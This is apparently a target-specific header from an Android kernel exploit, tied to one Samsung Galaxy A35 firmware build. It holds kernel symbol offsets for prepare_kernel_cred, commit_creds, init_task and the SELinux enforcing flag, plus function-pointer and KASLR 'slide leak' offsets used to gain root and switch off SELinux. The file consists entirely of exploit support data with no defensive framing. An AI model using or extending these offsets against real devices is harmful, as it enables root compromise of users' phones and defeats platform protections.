...
#define BUILD_FINGERPRINT \
  "samsung/a35xjvxx/essi:16/BP2A.250605.031.A3/A356EXXU5CYI8:user/release-keys"
#endif
...
#define P0_FINGERPRINT_HEADER \
  "targets/a35x-A356EXXU5CYI8/p0_fingerprint.h"
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00107ca0ULL
 ...
 * ------------------------------------------------------------------------- */
/* --- global / root symbols ------------------------------------------------ */
#define INIT_TASK_OFF             0x022afd40ULL
#define PREPARE_KERNEL_CRED_OFF   0x001130bcULL
#define COMMIT_CREDS_OFF          0x00112964ULL
#define OVERRIDE_CREDS_OFF        0x00112d4cULL
#define ROOT_TASK_GROUP_OFF       0x02493f40ULL
/* selinux_state.enforcing (first member of struct selinux_state) */
#define SELINUX_ENFORCING_OFF     0x025671b0ULL
#define KMALLOC_CACHES_OFF        0x01a4e270ULL
#define ANON_PIPE_BUF_OPS_OFF     0x0186bd60ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x0229ae20ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00100524ULL
...
#define ASHMEM_OPEN_OFF           0x00c84724ULL
#define ASHMEM_RELEASE_OFF        0x00c847a8ULL
#define ASHMEM_SHOW_FDINFO_OFF    0x00c848c8ULL
#define CONFIGFS_READ_ITER_OFF    0x00473db8ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00474274ULL
#define COPY_SPLICE_READ_OFF      0x003facc8ULL
#define NOOP_LLSEEK_OFF           0x003affa8ULL

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x02a24c0ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02a25a0ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x03c4440ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x0260b2c1ULL
